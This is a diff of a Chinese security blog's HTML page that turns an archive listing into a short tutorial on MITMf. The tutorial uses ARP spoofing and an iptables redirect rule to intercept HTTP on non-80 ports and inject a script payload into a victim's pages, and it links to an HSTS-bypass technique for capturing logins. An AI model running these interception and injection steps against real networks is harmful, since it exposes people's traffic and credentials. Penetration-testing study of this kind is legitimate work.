@@ -7,20 +7,28 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Blog: 2016/3 | 伏宸安全实验室-Future-Sec Information Security Lab</title>
+  <title>使用MITMF中间人攻击非80端口的HTTP | 伏宸安全实验室-Future-Sec Information Security Lab</title>
 
   <meta content="width=device-width, initial-scale=1.0" name="viewport">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 
-  <meta name="description" content="伏宸安全实验室Future-Sec Information Security Lab">
-<meta property="og:type" content="website">
-<meta property="og:title" content="伏宸安全实验室-Future-Sec Information Security Lab">
-<meta property="og:url" content="http://www.future-sec.com/archives/2016/03/index.html">
+  <meta name="description" content="说明MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。 问题在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。例如注入一段js 1sudo  python mitmf.py  -i wlan0 --spoof --arp --target  172.18.219.3 --gateway  172.18.219.1">
+<meta name="keywords" content="web安全,MITMf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用MITMF中间人攻击非80端口的HTTP">
+<meta property="og:url" content="http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html">
 <meta property="og:site_name" content="伏宸安全实验室-Future-Sec Information Security Lab">
-<meta property="og:description" content="伏宸安全实验室Future-Sec Information Security Lab">
+<meta property="og:description" content="说明MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。 问题在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。例如注入一段js 1sudo  python mitmf.py  -i wlan0 --spoof --arp --target  172.18.219.3 --gateway  172.18.219.1">
+<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/15129397954576.jpg">
+<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/15129398489571.jpg">
+<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/Screenshot35.jpg">
+<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/Screenshot36.jpg">
+<meta property="og:image" content="http://ozuqqvmm5.bkt.clouddn.com/15129405294732.jpg">
+<meta property="og:updated_time" content="2017-12-21T07:42:22.081Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="伏宸安全实验室-Future-Sec Information Security Lab">
-<meta name="twitter:description" content="伏宸安全实验室Future-Sec Information Security Lab">
+<meta name="twitter:title" content="使用MITMF中间人攻击非80端口的HTTP">
+<meta name="twitter:description" content="说明MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。 问题在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。例如注入一段js 1sudo  python mitmf.py  -i wlan0 --spoof --arp --target  172.18.219.3 --gateway  172.18.219.1">
+<meta name="twitter:image" content="http://ozuqqvmm5.bkt.clouddn.com/15129397954576.jpg">
   
     <link rel="alternative" href="/atom.xml" title="伏宸安全实验室-Future-Sec Information Security Lab" type="application/atom+xml">
   
@@ -115,126 +123,106 @@
   <div class="container">
   <ul class="breadcrumb">
     <li><a href="/">Home</a></li>
-    <li class="active">Blog</li>
+    <li><a href="/archives/">Blog</a></li>
+    <li class="active">Post</li>
   </ul>
-<div id="main">
-  <h1>Blog</h1>
-  <div class="row">
+  <section id="main">
+    
+    <h2 itemprop="name">
+      <a class="article-title" href="/using-MITMF-attack-not-80-port-http.html">使用MITMF中间人攻击非80端口的HTTP</a>
+    </h2>
 
+
+    <div class="row">
 <div class="col-md-9 col-sm-9 blog-posts">
-
-
-  <section class="archives-wrap">
-    <div class="archives">
-      
-	<div class="row">
-  <div class="col-md-4 col-sm-4">
-    
-      <img src="/images/2.jpg" class="img-responsive">
-    
+<article id="post-using-MITMF-attack-not-80-port-http" class="article article-type-post blog-item" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
   </div>
-  
-    <div class="col-md-8 col-sm-8">
-  
+  <div class="article-inner">
     
-    <h2 itemprop="name">
-      <a class="archive-article-title" href="/f-middlewarescan.html">中间件漏洞检测框架(F-MiddlewareScan)</a>
-    </h2>
+    
+    <header class="article-header">
+      <ul class="blog-info">
+	<li><i class="fa fa-user"></i> yaseng</li>
+	<li><i class="fa fa-calendar"></i>
+	  <time datetime="2017-12-20T16:00:00.000Z" itemprop="datePublished">2017/12/21</time>
 
-
-    <ul class="blog-info">
-      <li>
-      	<i class="fa fa-calendar"></i> 
-        <time datetime="2016-03-16T16:00:00.000Z" itemprop="datePublished">2016/03/17</time>
-
-      </li>
-      <li><i class="fa fa-comments"></i>
-        <a href="http://www.future-sec.com/f-middlewarescan.html#disqus_thread" class="article-comment-link">Comments</a>
-      </li>
-      <li>
-	<i class="fa fa-tags"></i>
-	
+	</li>
+	<li class="hidden-xs"><i class="fa fa-comments"></i>
+	  <a href="http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html#disqus_thread" class="article-comment-link">Comments</a>
+	</li>
+	<li class="hidden-xs"><i class="fa fa-tags"></i> 
+	  
   
-    <a href="/tags/python/" title="python">python</a>,
+    <a href="/tags/web安全/" title="web安全">web安全</a>,
   
-    <a href="/tags/自动化检测/" title="自动化检测">自动化检测</a>
+    <a href="/tags/MITMf/" title="MITMf">MITMf</a>
   
 
 
-      </li>
-    </ul>
-    <div class="blog-item">
+	</li>
+      </ul>
       
-	漏洞检测脚本以插件形式存在，可以自定义添加修改漏洞插件，存放于plugins目录，插件标准非常简单，只需对传入的IP，端口，超时进行操作，成功返回“YES|要打印出来的信息”即可。
-      
-    </div>
-    <br>
-    <br>
-    <a href="http://www.future-sec.com/f-middlewarescan.html" class="more">Read more <i class="icon-angle-right"></i></a>
+  <div class="article-category">
+    
+    Category: 
+    
+    <a class="article-category-link" href="/categories/web安全/">web安全</a>
   </div>
-</div>
-<hr class="blog-post-sep">
+  <br>
 
+
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-	<div class="row">
-  <div class="col-md-4 col-sm-4">
-    
-      <img src="/images/69145828_27.png" class="img-responsive">
-    
+      <!-- Table of Contents -->
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#说明"><span class="toc-number">1.</span> <span class="toc-text">说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#问题"><span class="toc-number">2.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解决"><span class="toc-number">3.</span> <span class="toc-text">解决</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更多"><span class="toc-number">4.</span> <span class="toc-text">更多</span></a></li></ol>
   </div>
-  
-    <div class="col-md-8 col-sm-8">
-  
-    
-    <h2 itemprop="name">
-      <a class="archive-article-title" href="/verification_code.html">简单验证码识别及工具编写思路</a>
-    </h2>
 
-
-    <ul class="blog-info">
-      <li>
-      	<i class="fa fa-calendar"></i> 
-        <time datetime="2016-03-06T16:00:00.000Z" itemprop="datePublished">2016/03/07</time>
-
-      </li>
-      <li><i class="fa fa-comments"></i>
-        <a href="http://www.future-sec.com/verification_code.html#disqus_thread" class="article-comment-link">Comments</a>
-      </li>
-      <li>
-	<i class="fa fa-tags"></i>
-	
-  
-    <a href="/tags/python/" title="python">python</a>,
-  
-    <a href="/tags/验证码/" title="验证码">验证码</a>
-  
-
-
-      </li>
-    </ul>
-    <div class="blog-item">
-      
-	虽然验证码发展到如今有许多人类都难以识别的状态了，但人有部分老系统使用的验证码异常的简单。还有一些网站由于程序员本身的素质或者缺乏相关图像相关的知识，所以并没有自己写验证码的生成程序，而是直接在网上随便复制粘贴一个Demo级别的代码来用，以达到网站有验证码的目的，而忽略了验证码的强弱性，导致很多网站的验证码都是爆款弱验证码
-      
-    </div>
-    <br>
-    <br>
-    <a href="http://www.future-sec.com/verification_code.html" class="more">Read more <i class="icon-angle-right"></i></a>
-  </div>
-</div>
-<hr class="blog-post-sep">
+        <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。<br>例如注入一段js</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">sudo </span> <span class="string">python </span><span class="string">mitmf.</span><span class="string">py </span> -i <span class="string">wlan0 </span><span class="built_in">--spoof</span> <span class="built_in">--arp</span> <span class="built_in">--target</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>3 <span class="built_in">--gateway</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>1  <span class="built_in">--inject</span> <span class="built_in">--html-payload</span> <span class="string">'&lt;script&gt;alert(0)&lt;/script&gt;'</span></div></pre></td></tr></table></figure>
+<p>victim 访问<br><a href="http://yaseng.org/project" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/project</a></p>
+<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15129397954576.jpg" alt=""></p>
+<p>访问非80端口的http web<br><a href="http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml" rel="external nofollow noopener noreferrer" target="_blank">http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml</a><br>无任何提示  </p>
+<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15129398489571.jpg" alt=""></p>
+<p>attack 端</p>
+<p><img src="http://ozuqqvmm5.bkt.clouddn.com/Screenshot35.jpg" alt="img"></p>
+<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>简单看了一下代码<br>MITMf/core/utils.py   line:84</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def HTTP(self, http_redir_port):</div><div class="line">    <span class="built_in">log</span>.<span class="built_in">debug</span>(<span class="string">"Setting iptables HTTP redirection rule from port 80 to &#123;&#125;"</span>.<span class="built_in">format</span>(http_redir_port))</div><div class="line">    <span class="built_in">os</span>.system(<span class="string">'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;'</span>.<span class="built_in">format</span>(http_redir_port))</div></pre></td></tr></table></figure>
+<p>iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。<br>例如 </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo  iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port  10000</div></pre></td></tr></table></figure>
+<p>attack</p>
+<p><img src="http://ozuqqvmm5.bkt.clouddn.com/Screenshot36.jpg" alt="mg"><br>victim<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15129405294732.jpg" alt=""></p>
+<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>使用mitmf 来绕过HSTS站点抓取登陆明文  <a href="http://yaseng.org/hsts-bypass-with-mitmf.html" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/hsts-bypass-with-mitmf.html</a></p>
 
       
     </div>
+  </div>
+  
     
-      <div id="page-nav" class="pagination">
-	<span class="page-number current">1</span>
-      </div>
-    
-  </section>
+<nav id="article-nav">
+  
+  
+    <a href="/Janus-CVE-2017-13156-analysis.html" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Janus漏洞(CVE-2017-13156)分析</div>
+    </a>
+  
+</nav>
+
+  
+  <br>
+</article>
+
+
+
 
 </div>
-
 <div class="col-md-3 col-sm-3 blog-sidebar">
   <!-- CATEGORIES START -->
 <h2 class="no-top-space">Categories</h2>
@@ -320,10 +308,9 @@
 <!-- END FEATURED POSTS -->                            
 
 </div>
-
 </div>
 
-</div>
+  </section>
 </div>
 
     <!-- BEGIN PRE-FOOTER -->
